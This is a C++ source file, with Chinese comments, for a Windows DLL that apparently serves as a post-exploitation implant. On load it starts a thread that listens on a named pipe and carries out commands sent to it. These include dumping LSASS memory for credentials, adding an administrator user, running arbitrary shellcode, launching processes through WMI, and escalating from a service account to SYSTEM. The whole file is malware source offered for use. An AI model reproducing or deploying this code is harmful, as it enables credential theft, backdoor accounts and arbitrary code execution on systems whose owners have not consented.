// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "service2system.h"
#include "utils.h"
#include "global.h"
#include "wmi.h"
#include "minidump.h"
#include "adduser.h"
#include "shellcode.h"
#include <corecrt_wstdio.h>

DWORD dwThreadId = 0;

LPWSTR g_pwszCommandLine = NULL; // 命令行
HANDLE g_hSystemToken = INVALID_HANDLE_VALUE;
PCHAR g_ShellcodeBuffer = NULL;
DWORD g_dwShellcodeSize = 0;


void* __RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

// Memory deallocation function for RPC.
void __RPC_USER midl_user_free(void* p)
{
    free(p);
}


void CheckSuccessAndSendMsg(BOOL bState,HANDLE hPipe) {
    DWORD dwWrittenSize = 0;
    CHAR Success[] = {0x01};
    CHAR Failed[] = { 0x00 };
    if (bState) {
        WriteFile(hPipe, Success, 1, &dwWrittenSize, NULL);
    }else{
        WriteFile(hPipe, Failed, 1, &dwWrittenSize, NULL);
    }
}

DWORD HandleCode(VOID) {
    HANDLE hPipe;
    DWORD dwError;
    DWORD dwLen;
    
    hPipe = CreateNamedPipe(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_WAIT | PIPE_TYPE_MESSAGE | PIPE_TYPE_BYTE | PIPE_READMODE_MESSAGE,
        PIPE_UNLIMITED_INSTANCES,
        BUFF_SIZE+1,
        BUFF_SIZE+1,
        0,
        NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        dwError = GetLastError();
        wprintf(L"[-] Create Pipe Error : %d \n", dwError);
        return dwError;
    }
    wprintf(L"[+] Create Pipe Success : %s \n", PIPE_NAME);
    for (;;) {
        if (ConnectNamedPipe(hPipe, NULL) > 0) {
            CHAR szBuffer[BUFF_SIZE];
            BYTE  bMethod; // 操作方法
            ZeroMemory(szBuffer, BUFF_SIZE);
            wprintf(L"[+] Client Connected...\n");
            // 读取操作方法
            ReadFile(hPipe, &bMethod, 1, &dwLen, NULL);
            switch (bMethod)
            {
            case METHOD_WMI_CREATE_PROCESS:
                /// <summary>
                /// 调用WMIC创建进程，无回显
                /// 参数：process
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                CheckSuccessAndSendMsg(WMICCreateProcess(char2wchar(szBuffer)), hPipe);
                break;
            case METHOD_MINIDUMP_LSASS:
                /// <summary>
                /// 高权限的情况下转储Lsass进程内存
                /// 参数：dump
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                CheckSuccessAndSendMsg(MiniDumpLsass(), hPipe);
                break;
            case METHOD_ADD_USER:
                /// <summary>
                /// 高权限的情况下添加用户
                /// 参数：user
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                CheckSuccessAndSendMsg(CreateAdminUserInternal(), hPipe);
                break;
            case METHOD_SHELL_CODE_LOADE:
                /// <summary>
                /// 执行Shellcode
                /// 参数：code
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                CheckSuccessAndSendMsg(ExecuteShellCode(szBuffer, dwLen), hPipe);
                break;
            case METHOD_GETSYSTEM:
                /// <summary>
                /// 创建命名管道
                /// 参数：system
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                CheckSuccessAndSendMsg(Service2System(), hPipe);
                break;
            case METHOD_SYSTEM_EXECUTE:
                /// <summary>
                /// 触发RPC连接提权管道
                /// 参数：system-run
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                CheckSuccessAndSendMsg(Execute(), hPipe);
                break;
            case METHOD_SET_SYSTEM_SHELLCODE:
                /// <summary>
                /// 设置全局Shellcode
                /// 参数：system-code
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                ZeroMemory(szBuffer, BUFF_SIZE);
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                g_ShellcodeBuffer = new char[dwLen];
                RtlCopyMemory(g_ShellcodeBuffer, szBuffer, dwLen);
                g_dwShellcodeSize = dwLen;
                break;
            case METHOD_UNSET_SYSTEM_SHELLCODE:
                /// <summary>
                /// 清空全局Shellcode
                /// 参数：system-uncode
                /// </summary>
                /// <param name=""></param>
                /// <returns></returns>
                g_dwShellcodeSize = 0;
                g_ShellcodeBuffer = NULL;
                break;
                
            default:

                break;
            }
            // 关闭连接
            DisconnectNamedPipe(hPipe);
        }
    }

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HandleCode, NULL, NULL, &dwThreadId);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

